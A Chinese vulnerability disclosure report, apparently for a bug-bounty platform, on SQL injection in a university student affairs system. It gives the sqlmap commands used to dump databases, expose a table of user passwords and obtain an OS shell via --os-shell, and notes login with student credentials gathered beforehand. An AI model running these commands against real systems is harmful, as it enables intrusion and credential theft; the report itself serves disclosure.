# 某高校

------

漏洞基本信息

**资产所在网段：**内网
**漏洞URL：**

# 某高校学工管理系统存在sql注入

## 漏洞复现

1. **打开URL** 使用信息搜集得到的学生账号密码登录.![image-20260309142024060](C:\Users\22709\AppData\Roaming\Typora\typora-user-images\image-20260309142024060.png)
2. 进入宿舍管理。点击公寓制度。![null](https://src.sjtu.edu.cn/media/images/2026/02/06/4938d4ca-9b53-4468-a002-94085007e906-ZIQAmEXU.png)在标题查询处，插入单引号后直接返回sql语法详细错误，通过报错信息，推断为mssql数据库。![null](https://src.sjtu.edu.cn/media/images/2026/02/06/d8421aed-74dc-456f-9e11-3281fdf3d480-RRVfmiA2.png)
3. 再插入一个单引号尝试闭合。查询后返回正常，成功闭合语句。![null](https://src.sjtu.edu.cn/media/images/2026/02/06/0e2ed2de-703a-4fd3-9545-b66f477fa8e8-Y9frC5z2.png)
4. 确定存在注入点后直接使用sqlmap去注入。保存数据包，**sqlmap -r sqlmap.txt -p NewsTitle --dbms=mssql --batch** 可以看到有四种注入方式。![null](https://src.sjtu.edu.cn/media/images/2026/02/06/fd3b0115-7e7e-429d-a914-45fa747b8007-U3uF07BI.png)
5. 跑出数据库 **sqlmap -r sqlmap.txt -p NewsTitle --dbms=mssql --batch --dbs**![image-20260309143208065](C:\Users\22709\AppData\Roaming\Typora\typora-user-images\image-20260309143208065.png)
6. 数据库中的表![image-20260309143256816](C:\Users\22709\AppData\Roaming\Typora\typora-user-images\image-20260309143256816.png)
7. Userinfo表中存储用户账户密码等敏感数据；![image-20260309142918571](C:\Users\22709\AppData\Roaming\Typora\typora-user-images\image-20260309142918571.png)
8. 执行--os-shell命令，成功获得数据库所在操作系统的命令行交互权限。**sqlmap -r sqlmap.txt -p NewsTitle --dbms=mssql --batch --os-shell**。执行whoami命令。![image-20260309143042790](C:\Users\22709\AppData\Roaming\Typora\typora-user-images\image-20260309143042790.png)ipconfig![image-20260309143012392](C:\Users\22709\AppData\Roaming\Typora\typora-user-images\image-20260309143012392.png)

## 漏洞危害

攻击者通过--os-shell获得数据库所在操作系统的命令行交互权限，可进一步提权或加入后门。

## 修复建议

严格过滤用户输入语句，增加waf拦截。
